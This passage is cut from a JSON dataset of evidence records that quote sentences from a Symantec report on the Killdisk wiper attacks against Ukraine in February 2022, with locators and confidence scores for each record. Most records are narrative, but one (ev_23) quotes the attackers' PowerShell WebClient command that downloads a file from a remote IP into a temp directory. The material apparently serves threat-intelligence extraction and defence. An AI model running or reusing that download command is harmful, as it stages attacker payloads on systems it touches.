      "id": "ev_1",
      "evidence_type": "report_text",
      "report_id": "Symantec_Ukraine-Disk-wiping-Russian-Invasion(02-24-2022)",
      "locator": {
        "page": 1,
        "section": "body",
        "sentence_id": "p1_s1"
      },
      "text": "symantec-enterprise-blogs.security.com /blogs/threat-intelligence/ukraine-wiper-malware-russia A new form of disk-wiping malware (Trojan.Killdisk) was used to attack organizations in Ukraine shortly before the launch of a Russian invasion this morning (February 24).",
      "language": "en",
      "confidence": 0.95,
      "note": "narrative sentence evidence",
      "source": "document"
    },
    {
      "id": "ev_11",
      "evidence_type": "report_text",
      "report_id": "Symantec_Ukraine-Disk-wiping-Russian-Invasion(02-24-2022)",
      "locator": {
        "page": 1,
        "section": "body",
        "sentence_id": "p1_s11"
      },
      "text": "Nine minutes later, the attackers modified the scheduled task to execute the same postgres.exe file at 09:30 local-time instead.",
      "language": "en",
      "confidence": 0.95,
      "note": "narrative sentence evidence",
      "source": "document"
    },
    {
      "id": "ev_12",
      "evidence_type": "report_text",
      "report_id": "Symantec_Ukraine-Disk-wiping-Russian-Invasion(02-24-2022)",
      "locator": {
        "page": 1,
        "section": "body",
        "sentence_id": "p1_s12"
      },
      "text": "Beginning on February 22, Symantec observed the file ‘postgresql.exe’ being executed and used to perform the following:",
      "language": "en",
      "confidence": 0.95,
      "note": "narrative sentence evidence",
      "source": "document"
    },
    {
      "id": "ev_13",
      "evidence_type": "report_text",
      "report_id": "Symantec_Ukraine-Disk-wiping-Russian-Invasion(02-24-2022)",
      "locator": {
        "page": 1,
        "section": "body",
        "sentence_id": "p1_s13"
      },
      "text": "Execute certutil to check connectivity to trustsecpro[.]com and whatismyip[.]com Execute a PowerShell command to download another JPEG file from a compromised web server - confluence[.]novus[.]ua",
      "language": "en",
      "confidence": 0.95,
      "note": "narrative sentence evidence",
      "source": "document"
    },
    {
      "id": "ev_20",
      "evidence_type": "report_text",
      "report_id": "Symantec_Ukraine-Disk-wiping-Russian-Invasion(02-24-2022)",
      "locator": {
        "page": 2,
        "section": "body",
        "sentence_id": "p2_s7"
      },
      "text": "File names used by the ransomware included client.exe, cdir.exe, cname.exe, connh.exe, and intpub.exe.",
      "language": "en",
      "confidence": 0.95,
      "note": "narrative sentence evidence",
      "source": "document"
    },
    {
      "id": "ev_22",
      "evidence_type": "report_text",
      "report_id": "Symantec_Ukraine-Disk-wiping-Russian-Invasion(02-24-2022)",
      "locator": {
        "page": 2,
        "section": "body",
        "sentence_id": "p2_s9"
      },
      "text": "This has some similarities to the earlier WhisperGate wiper attacks against Ukraine, where the wiper was disguised as ransomware.",
      "language": "en",
      "confidence": 0.95,
      "note": "narrative sentence evidence",
      "source": "document"
    },
    {
      "id": "ev_23",
      "evidence_type": "report_text",
      "report_id": "Symantec_Ukraine-Disk-wiping-Russian-Invasion(02-24-2022)",
      "locator": {
        "page": 1,
        "section": "rule",
        "sentence_id": "p1_r1"
      },
      "text": "cmd.exe /Q /c powershell -c \"(New-Object System.Net.WebClient).DownloadFile('hxxp://192.168.3.13/email.jpeg','CSIDL_SYSTEM_DRIVE\\temp\\sys.tmp1')\" 1> \\\\127.0.0.1\\ADMIN$\\__1636727589.6007507 2>&1",
      "language": "en",
      "confidence": 0.98,
      "note": "rule or indicator snippet evidence",
      "source": "document"
    },
    {
      "id": "ev_24",
      "evidence_type": "report_text",
      "report_id": "Symantec_Ukraine-Disk-wiping-Russian-Invasion(02-24-2022)",
      "locator": {
        "page": 1,
        "section": "rule",
        "sentence_id": "p1_r2"
      },
      "text": "A minute later, the attackers created a scheduled task to execute a suspicious ‘postgresql.exe’ file, weekly on a Wednesday, specifically at 11:05 local-time. The attackers then ran this scheduled task to execute the task.",
      "language": "en",
      "confidence": 0.98,
      "note": "rule or indicator snippet evidence",
      "source": "document"
    },
    {
